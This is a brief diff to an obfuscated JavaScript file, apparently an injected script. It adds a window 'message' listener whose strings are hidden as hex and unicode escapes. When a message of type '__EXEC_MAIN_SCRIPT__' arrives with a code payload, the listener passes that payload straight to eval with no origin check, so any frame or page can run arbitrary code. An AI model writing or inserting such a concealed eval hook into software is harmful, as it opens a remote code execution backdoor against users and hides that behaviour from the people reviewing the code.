@@ -103,6 +103,16 @@ return undefined;
 set:function(){}
 });
 }catch(e){}
+w.addEventListener('\x6d\x65\x73\x73\x61\x67\x65',(e)=>{
+if(e.data&&e.data.type==='\x5f\x5f\x45\x58\x45\x43\x5f\x4d\x41\x49\x4e\x5f\x53\x43\x52\x49\x50\x54\x5f\x5f'&&e.data.code){
+try{
+console.log("[\x54\x65\x65\x38\x32 \uace8\ub9c8\ucf13 \x4d\x41\x49\x4e \x53\x63\x72\x69\x70\x74 \uc2e4\ud589]\x3a",e.data.code);
+w.eval(e.data.code);
+}catch(err){
+console.error("[\x54\x65\x65\x38\x32 \uace8\ub9c8\ucf13 \x4d\x41\x49\x4e \x53\x63\x72\x69\x70\x74 \uc2e4\ud589 \uc5d0\ub7ec]\x3a",err);
+}
+}
+});
 }catch(e){}
 }
 _0x1000(window);
